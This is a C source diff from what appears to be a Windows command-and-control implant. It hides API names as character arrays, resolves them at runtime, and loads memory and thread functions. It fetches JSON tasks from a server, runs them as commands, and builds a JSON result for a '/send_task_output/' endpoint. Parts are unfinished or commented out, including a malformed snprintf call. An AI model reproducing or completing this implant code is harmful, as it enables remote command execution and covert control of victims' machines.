@@ -27,6 +27,7 @@ typedef int(WINAPI *PRINTF)(char *format, ...);
 typedef void *(WINAPI *CALLOC)(size_t num, size_t size);
 typedef void(WINAPI *FREE)(PVOID memblock);
 typedef void *(WINAPI *MALLOC)(size_t);
+typedef int(WINAPI *SNPRINTF)(CHAR* str, DWORD size, PCSTR format, ...);
 
 // user32.dll export
 typedef int(WINAPI *MESSAGEBOXW)(HWND, LPWSTR, LPWSTR, UINT32);
@@ -98,6 +99,7 @@ typedef struct API_ {
     UINT64 printf;
     UINT64 CryptStringToBinaryA;
     UINT64 StrToIntW;
+    UINT64 snprintf;
 } API, *PAPI;
 
 typedef struct ESG_STD_API_ {
@@ -935,6 +937,7 @@ void messagebox() {
     CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0};
     CHAR wprintf_c[] = {'w', 'p', 'r', 'i', 'n', 't', 'f', 0};
     CHAR printf_c[] = {'p', 'r', 'i', 'n', 't', 'f', 0};
+    CHAR snprintf_c[] = {'s', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0};
     CHAR malloc_c[] = {'m', 'a', 'l', 'l', 'o', 'c', 0};
     CHAR calloc_c[] = {'c', 'a', 'l', 'l', 'o', 'c', 0};
     CHAR free_c[] = {'f', 'r', 'e', 'e', 0};
@@ -981,6 +984,7 @@ void messagebox() {
     api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
     api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
     api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
+    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
     api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
     api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
     api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
@@ -1036,13 +1040,21 @@ void messagebox() {
     task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
 
     CHAR* output;
-    WCHAR* json;
+    WCHAR jsonFormat[] = {
+    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '%', 's', ',', 
+    ' ', '"', 'a', 'g', 'e', 'n', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"', 
+    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 
+    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}', '\0'
+    };
     output = ((RUNCMD)PEsgStdApi->RunCmd)(task);
+    //WCHAR* json = (WCHAR*)((CALLOC)api->calloc)(SIZEHERE ,sizeof(WCHAR));
 
     WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
-    ((PRINTF)api->printf)(output);
+
+    //int written = ((SNPRINTF)api->snprintf)(json, , json, taskId, agentUuid, output);
     //PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
 
+    ((FREE)api->free)(output);
     ((FREE)api->free)(jsonResponse);
     //((FREE)api->free)(pEsgStdDll);
 }
